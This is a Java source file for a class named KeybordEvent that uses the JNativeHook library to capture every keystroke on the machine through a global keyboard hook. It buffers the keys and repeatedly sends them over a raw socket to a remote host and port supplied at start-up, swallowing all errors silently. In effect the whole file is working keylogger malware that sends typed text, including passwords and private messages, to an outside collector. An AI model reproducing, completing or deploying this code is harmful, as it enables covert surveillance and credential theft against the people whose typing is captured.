/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package threading;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.InetAddress;
import java.net.Socket;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.NativeInputEvent;
import org.jnativehook.SwingDispatchService;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author abaza
 */
public class KeybordEvent implements NativeKeyListener {

    String Data = "";
    NativeInputEvent NIE = null;
    String Host = null;
    int port = 0;
    private static Socket socket;
    OutputStreamWriter osw = null;
    OutputStream os = null;
    BufferedWriter bw = null;

    public void Start(String Host, int Port) {
        try {
            this.Host = Host;
            this.port = Port;
            GlobalScreen.setEventDispatcher(new SwingDispatchService());
            GlobalScreen.registerNativeHook();
            GlobalScreen.dispatchEvent(NIE);
            GlobalScreen.addNativeKeyListener(this);

        } catch (NativeHookException ex) {
        }

    }

    public void Stop() {
        try {
            GlobalScreen.unregisterNativeHook();
            GlobalScreen.removeNativeKeyListener(this);
        } catch (NativeHookException ex) {
        }
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
        int Start_Len = "NATIVE_KEY_PRESSED,".length();
        String temp = nke.paramString().substring(Start_Len);
        String[] temp2 = temp.split(",");
        String Result = temp2[1].split("=")[1];

        switch (Result) {
            case "Enter":
                Data += "↲";
                Send(Data);
                Result = "";
                break;
            case "Space":
                Data += " ";
                Send(Data);
                Result = "";
                break;
            case "Period":
                Data += ".";
                Send(Data);
                Result = "";
                break;
            case "Left Shift":
            case "Right Shift":
                Data += "▲";
                break;
            case "Caps Lock":
                Data += "▰";
                break;
            case "Tab":
                Data += "↹";
                Send(Data);
                break;
            case "Up":
                Data += "↑";
                Send(Data);
                Result = "";
                break;
            case "Down":
                Data += "↓";
                Send(Data);
                Result = "";
                break;
            case "Right":
                Data += "→";
                Send(Data);
                Result = "";
                break;
            case "Left":
                Data += "←";
                Send(Data);
                Result = "";
                break;
            case "Backspace":
                Data += "↞";
                Send(Data);
                Result = "";
                break;
            case "Left Control":
            case "Right Control":
                Data += "⊕+";
                break;
            case "Left Alt":
            case "Right Alt":
                Data += "⊗+";
                break;
            default:
                if (!Result.isEmpty()) {
                    Data += Result;
                }
        }
    }

    public void Send(String sendMessage) {
        try {
            InetAddress address = InetAddress.getByName(this.Host);
            socket = new Socket(address, this.port);
            os = socket.getOutputStream();
            osw = new OutputStreamWriter(os);
            bw = new BufferedWriter(osw);
            bw.write(sendMessage);
            bw.flush();
            Data = "";
        } catch (IOException ex) {
        } finally {
            //Closing the socket
            try {
                socket.close();
            } catch (Exception e) {
            }
        }

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
//        throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
//        throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
    }

}
